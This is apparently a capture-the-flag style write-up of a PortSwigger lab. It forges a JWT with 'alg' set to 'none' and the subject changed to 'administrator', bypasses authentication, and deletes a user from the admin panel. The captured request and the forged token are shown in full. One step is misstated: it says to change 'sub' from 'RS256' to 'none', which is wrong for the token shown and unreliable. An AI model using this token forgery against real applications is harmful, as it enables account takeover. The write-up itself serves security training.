## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/c31c2925-866c-4e46-a78c-5a6fd3078013)

## Overview :

 Among other things, the JWT header contains an `alg` parameter. This tells the server which algorithm was used to sign the token and, therefore, which algorithm it needs to use when verifying the signature.

```json
{
    "alg": "HS256",
    "typ": "JWT"
}
```

This is inherently flawed because the server has no option but to implicitly trust user-controllable input from the token which, at this point, hasn't been verified at all. 

JWTs can be signed using a range of different algorithms, but can also be left unsigned. In this case, the alg parameter is set to none, which indicates a so-called "**unsecured JWT**". 

## Solution :

Login as wiener using the provided credentials.

In the *HTTP History* tab, we can see these 3 requests have JWT in it.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/82410244-2b36-4b4b-950a-ef7b258a164e)

Send the following request to repeater tab,

```http
GET /my-account?id=wiener HTTP/2
Host: 0a9e00320421ca86804b30ff00a40044.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9e00320421ca86804b30ff00a40044.web-security-academy.net/login
Cookie: session=eyJraWQiOiIzN2I4MjNkMy1hNzc1LTRiM2UtYmY5ZC05MjQwNjYxMTMxYzAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5NTYzMzk5OH0.rT0e0nC2JMnNtqWc-s1ueksp4lRQuzUo8yN9darPvbC2vfwsyMG_zTv08YewscJlTjRkPyOMzDV0IFonMHhYoXB1cY7YuJ9Wyhv6lUyDiPNQmvB5O1RkRjwW4NGOGpo2_hEJlg7YH60KbfKFclCwP3GYS49dGotWe0whq-SgI-NA4NNDibjY6G7R1hUk8m9sukWuRU8d9L95lxL2KN-rTPNeWFi8yoWVaSfEFkUUH8fUznauMmkod-xVAapnrKRL6AYhWaHscxYRNCTN6Hx5jBdYardVQGVFepejXpdpcujZyn0_RnZZ_8aMdgYBRxJOEzBgit2W8m3LNJIB9UJrgw
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

Decode the JWT using [jwt.io](https://jwt.io).

**Header -**

```json
{
  "kid": "37b823d3-a775-4b3e-bf9d-9240661131c0",
  "alg": "RS256"
}
```

**Payload -**

```json
{
  "iss": "portswigger",
  "sub": "wiener",
  "exp": 1695633998
}
```

Change the `"alg" : "RS256"` to `"alg" : "none"`  & also change the `"sub" : "RS256"` to `"sub" : "none"`.

The following is the resulting token.

```
eyJraWQiOiIzN2I4MjNkMy1hNzc1LTRiM2UtYmY5ZC05MjQwNjYxMTMxYzAiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2OTU2MzM5OTh9.
```
> Note that the payload part is trailing with  a **.** Which indicates that the token is not signed since **none** algorithm > is used.

Replace the original JWT token with the one that we created & forward the request. 

Now we have an option to access the admin panel.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/e39cd05d-7bd0-41b8-aa32-1128e0a92b24)

Delete the user carlos to solve the lab.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/7c0030b1-2a55-449a-afee-76d53e0282c8)
